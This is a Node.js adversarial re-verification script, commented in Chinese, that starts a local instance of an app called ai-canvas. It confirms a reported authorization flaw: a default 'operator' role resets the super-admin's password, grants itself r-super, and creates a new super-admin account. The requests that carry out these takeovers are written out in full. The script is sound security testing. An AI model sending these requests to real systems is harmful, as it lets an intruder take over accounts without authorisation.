// 对抗性复验 V2：默认「运营」角色能否自我提权 / 重置超管密码
//
// 全程走真实 HTTP + 真实 RBAC，不 mock。
// 攻击者 = 第 2 个账号（accounts.js:126 默认给 r-operator）。
//
// 运行：& "...\node.exe" E:\DSH项目\ai-canvas\reports\verify\v2-privesc.mjs
import { spawn } from "node:child_process";
import fs from "node:fs";
import net from "node:net";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, "..", "..");
const NODE = process.execPath;

let pass = 0;
let fail = 0;
function check(name, cond, extra = "") {
  if (cond) { pass++; console.log(`  ✅ ${name}${extra ? "  " + extra : ""}`); }
  else { fail++; console.log(`  ❌ ${name}${extra ? "  " + extra : ""}`); }
}

function pickPort() {
  return new Promise((resolve) => {
    const srv = net.createServer();
    srv.listen(0, "127.0.0.1", () => { const p = srv.address().port; srv.close(() => resolve(p)); });
  });
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const DIR = path.join(ROOT, ".verifydata", "v2");
fs.rmSync(DIR, { recursive: true, force: true });
fs.mkdirSync(DIR, { recursive: true });
const PORT = await pickPort();
const BASE = `http://127.0.0.1:${PORT}`;
const child = spawn(NODE, ["server/index.js"], {
  cwd: ROOT,
  stdio: "inherit",
  env: {
    ...process.env,
    AI_CANVAS_HOME: DIR,
    AI_CANVAS_OUTPUTS: path.join(DIR, "outputs"),
    AI_CANVAS_VAULT: "file",
    PORT: String(PORT)
  }
});

let TOKEN = "";
async function api(pathname, { method = "GET", body } = {}) {
  const res = await fetch(`${BASE}${pathname}`, {
    method,
    headers: { "Content-Type": "application/json", "X-AI-Canvas-Token": TOKEN },
    body: body ? JSON.stringify(body) : undefined
  });
  let data = null;
  try { data = await res.json(); } catch { data = null; }
  return { status: res.status, data };
}
async function bootWait() {
  const deadline = Date.now() + 25000;
  while (Date.now() < deadline) {
    try { const r = await fetch(`${BASE}/api/session`); if (r.ok) return true; } catch { /* wait */ }
    await sleep(200);
  }
  return false;
}
if (!(await bootWait())) { child.kill(); throw new Error("服务端启动失败"); }

console.log("\n=== V2：默认「运营」角色的越权实测 ===");
console.log(`  隔离数据目录：${DIR}   服务端：${BASE}`);

const s = await api("/api/session");
TOKEN = s.data.token;

// --- 前置：超管 + 两个「运营」账号 ---
const setup = await api("/api/auth/setup", { method: "POST", body: { username: "boss", password: "boss8888" } });
const bossId = setup.data?.user?.id;
check("首位账号自动成为超管", (setup.data?.user?.roleIds || []).includes("r-super"), `bossId=${bossId}`);

const mkOp = async (name) => {
  const r = await api("/api/admin/accounts", { method: "POST", body: { username: name, password: "op123456" } });
  return r.data?.user;
};
const op1 = await mkOp("op1");
const op2 = await mkOp("op2");
check("第 2/3 个账号默认被授予「运营」r-operator",
  JSON.stringify(op1?.roleIds) === '["r-operator"]' && JSON.stringify(op2?.roleIds) === '["r-operator"]',
  `op1=${JSON.stringify(op1?.roleIds)} op2=${JSON.stringify(op2?.roleIds)}`);

// --- 以 op1（纯运营）登录 ---
await api("/api/auth/login", { method: "POST", body: { username: "op1", password: "op123456" } });
const perms1 = await api("/api/auth/perms");
const P = perms1.data?.perms || [];
console.log(`  op1 登录后 roleIds=${JSON.stringify(perms1.data?.roleIds)} perms=${JSON.stringify(P)}`);
check("「运营」角色确实持有 admin:account:edit", P.includes("admin:account:edit"));
check("「运营」角色确实持有 admin:account:reset", P.includes("admin:account:reset"));
check("「运营」角色确实持有 admin:account:create", P.includes("admin:account:create"));

// --- 攻击①：op1 重置超管密码 ---
const reset = await api(`/api/admin/accounts/${bossId}/reset`, { method: "POST", body: { password: "hacked999" } });
check("【越权】运营成功重置超管密码（HTTP 200 ok）", reset.status === 200 && reset.data?.ok === true,
  `status=${reset.status} body=${JSON.stringify(reset.data)}`);
const relogin = await api("/api/auth/login", { method: "POST", body: { username: "boss", password: "hacked999" } });
check("【越权】用被重置的新密码成功登录超管账号 → 完整接管",
  relogin.status === 200 && relogin.data?.ok === true && (relogin.data?.user?.roleIds || []).includes("r-super"),
  `status=${relogin.status} roleIds=${JSON.stringify(relogin.data?.user?.roleIds)}`);

// --- 攻击②：op2（纯运营）自我提权到 r-super ---
await api("/api/auth/login", { method: "POST", body: { username: "op2", password: "op123456" } });
const before2 = await api("/api/auth/perms");
const put = await api(`/api/admin/accounts/${op2.id}`, { method: "PUT", body: { roleIds: ["r-super"] } });
check("【越权】运营 PUT 自己 roleIds=[\"r-super\"] 成功（HTTP 200 ok）",
  put.status === 200 && put.data?.ok === true, `status=${put.status} roleIds=${JSON.stringify(put.data?.user?.roleIds)}`);
const after2 = await api("/api/auth/perms");
check("【越权】权限立即落地：从运营权限变为全量权限",
  !(before2.data?.perms || []).includes("admin:setting:edit") && (after2.data?.perms || []).includes("admin:setting:edit"),
  `before=${(before2.data?.perms || []).length} 条 → after=${(after2.data?.perms || []).length} 条；after.roleIds=${JSON.stringify(after2.data?.roleIds)}`);

// --- 攻击③（附加最短路径）：运营直接新建一个超管账号 ---
await api("/api/auth/login", { method: "POST", body: { username: "op1", password: "op123456" } });
const pwn = await api("/api/admin/accounts", {
  method: "POST",
  body: { username: "pwn", password: "pwn123456", roleIds: ["r-super"] }
});
check("【附加】运营 create 接口直接创建 roleIds=[\"r-super\"] 的账号（无 roleIds 白名单）",
  pwn.status === 200 && JSON.stringify(pwn.data?.user?.roleIds) === '["r-super"]',
  `status=${pwn.status} roleIds=${JSON.stringify(pwn.data?.user?.roleIds)}`);
if (pwn.data?.user) {
  const pl = await api("/api/auth/login", { method: "POST", body: { username: "pwn", password: "pwn123456" } });
  check("【附加】新账号可直接登录并持有超管身份",
    pl.data?.ok === true && (pl.data?.user?.roleIds || []).includes("r-super"),
    `roleIds=${JSON.stringify(pl.data?.user?.roleIds)}`);
}

child.kill();
console.log(`\n  V2 汇总：通过 ${pass} / 失败 ${fail}`);
console.log(pass >= 7 ? "  → 报告的 V2 结论被实测坐实（越权请求全部 HTTP 200）\n" : "  → 存在未坐实项，需人工判断\n");
process.exit(0);
